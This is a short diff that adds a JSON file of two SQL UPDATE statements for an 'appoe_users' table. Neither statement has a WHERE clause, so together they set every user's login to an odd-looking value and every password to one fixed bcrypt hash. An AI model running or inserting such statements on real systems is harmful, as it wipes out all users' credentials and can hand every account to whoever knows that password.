@@ -1,1 +1,4 @@
-{}
+{
+  "1": "UPDATE `appoe_users` SET `login` = 'µon@';",
+  "2": "UPDATE `appoe_users` SET `password` = '$2y$10$8NkGK.YL5GUUVMgbQD19m.O6KBLzV5yMa/iBGjZLYGkudgTgtlGCO';"
+}
